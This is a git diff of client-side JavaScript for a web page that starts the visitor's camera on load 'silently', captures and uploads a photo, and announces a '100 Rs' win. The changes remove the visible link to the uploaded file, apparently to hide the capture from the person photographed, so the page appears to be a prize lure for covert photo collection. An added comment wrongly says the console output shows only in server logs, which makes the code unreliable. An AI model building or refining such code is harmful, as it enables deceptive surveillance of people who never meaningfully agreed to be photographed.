@@ -2,7 +2,6 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const captureBtn = document.getElementById("captureBtn");
 const status = document.getElementById("status");
-const fileUrlDiv = document.getElementById("fileUrl");
 
 let streamReady = false;
 
@@ -30,7 +29,6 @@ function showLoadingText(text) {
 
 captureBtn.addEventListener("click", async () => {
   status.textContent = "";
-  fileUrlDiv.textContent = "";
 
   if (!streamReady) await startCamera();
 
@@ -51,9 +49,9 @@ captureBtn.addEventListener("click", async () => {
 
       clearInterval(loader);
 
-      if (data && data.success && data.filePath) {
+      if (data && data.success) {
         status.textContent = "🎉 You WIN 100 Rs successfully!";
-        fileUrlDiv.innerHTML = `<a href="${data.filePath}" target="_blank" rel="noopener noreferrer">${data.filePath}</a>`;
+        console.log("Uploaded file path:", data.filePath); // 👈 Only visible in Render logs
       } else {
         status.textContent = "❌ Upload failed. Try again.";
       }
@@ -64,5 +62,5 @@ captureBtn.addEventListener("click", async () => {
   }, "image/jpeg");
 });
 
-// Start camera early but silently, no message
+// Start camera early but silently
 startCamera();
